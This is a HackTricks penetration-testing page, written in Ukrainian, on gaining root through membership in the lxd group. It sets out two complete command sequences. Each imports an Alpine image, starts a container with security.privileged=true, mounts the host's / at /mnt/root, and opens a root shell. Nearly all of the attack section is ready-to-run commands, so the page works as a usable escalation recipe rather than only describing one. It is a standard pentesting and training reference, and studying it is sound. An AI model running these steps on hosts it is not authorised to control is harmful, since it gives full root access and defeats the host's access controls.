# Група lxd/lxc - ескалація привілеїв

{{#include ../../../banners/hacktricks-training.md}}

Членство в групі керування LXD на хості (зазвичай _**lxd**_) може надати шлях до root, дозволяючи повністю контролювати daemon.<sup>[[1]](#references)</sup>

## Експлуатація без інтернету

### Метод 1

Ви можете завантажити образ Alpine із trusted repository для використання з LXD.
Canonical's LXD image server публікує щоденні збірки: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Просто завантажте **lxd.tar.xz** і **rootfs.squashfs** з найновішої збірки (назва каталогу — це дата).<sup>[[8]](#references)</sup>

Також можна встановити distrobuilder на своїй машині, дотримуючись [інструкцій проєкту](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Завантажте **incus.tar.xz** (**lxd.tar.xz**, якщо ви завантажили його із сервера образів Canonical) і **rootfs.squashfs**, потім імпортуйте образ і створіть контейнер.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Якщо ви побачите цю помилку _**Error: No storage pool found. Please create a new storage pool**_\
> Виконайте **`lxd init`**, налаштуйте стандартний storage pool, потім **повторіть** попередній фрагмент команд.<sup>[[2]](#references)</sup>

Нарешті, запустіть container і відкрийте root shell у файловій системі host:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Метод 2

Створіть Alpine image і запустіть його з прапорцем `security.privileged=true`, який зіставляє root контейнера з root host; монтування `/` після цього відкриває файлову систему host усередині контейнера.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Як посилити безпеку LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Контейнери та віртуальні машини LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Як копіювати та імпортувати образи](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Як створювати образи за допомогою distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Визначення образу Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Скрипт збирання lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Сервер образів LXD](https://images.lxd.canonical.com/)
- [9] [Тип: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
